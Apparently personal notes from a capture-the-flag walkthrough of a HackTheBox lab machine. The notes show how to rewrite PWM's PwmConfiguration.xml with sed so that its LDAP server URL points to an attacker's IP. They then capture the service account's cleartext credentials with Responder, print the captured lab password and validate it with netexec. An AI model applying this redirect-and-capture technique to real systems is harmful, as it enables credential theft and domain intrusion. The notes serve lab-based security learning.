Locate PWM config files (e.g., `PwmConfiguration.xml`).

In the PWM container, the configuration file is always stored in:
*/config/PwmConfiguration.xml*.

#### **Why this file matters**

`PwmConfiguration.xml` contains the LDAP connection settings. 

By modifying:

```
<ldapServerUrls>
    <value>ldaps://dc01.fries.htb:636</value>
</ldapServerUrls>
```

…to point to your machine:


```
ldap://<ATTACKER_IP>:389
```

PWM will authenticate to _you_, and you capture **cleartext LDAP credentials** via Responder.

That’s how you get:

```
svc_infra : m6tneOMAh5p0wQ0d
```

Which unlocks the AD pivot.

#PWM_container
- Run:

```
cat /config/PwmConfiguration.xml | grep "ldap*"
```

![[ldap.serverurls.png]]

- Modify the file to point to your the *ATTACKING MACHINE IP* to capture the service user's credentials while listening with `responder`.

```
sed -i 's|ldaps://dc01.fries.htb:636|ldap://<IP_ATTACKER>:389|' PwmConfiguration.xml
```

## Setup a listenr

#Attacking_machine 
Run the following code:

```
responder -I tun0 -wdv
```

![[responder.png]]

## Domain credentials

#Attacking_machine 
Visit the hosted page:

URL = https://pwm.fries.htb

![[pwm.fries.htb.png]]

After enter the page, (you can enter any credentials) you'll see the following on the listener.

![[listen_events.png]]

You got the credentials:  `svc_infra::m6tneOMAh5p0wQ0d`

## Testing credentials

#Attacking_machine 
Run:
```
netexec ldap <MACHINE IP> -u svc_infra -p 'm6tneOMAh5p0wQ0d'
```

![[testing_creds.png]]

They are valid.

**Next step:** [[GMSA password dump]]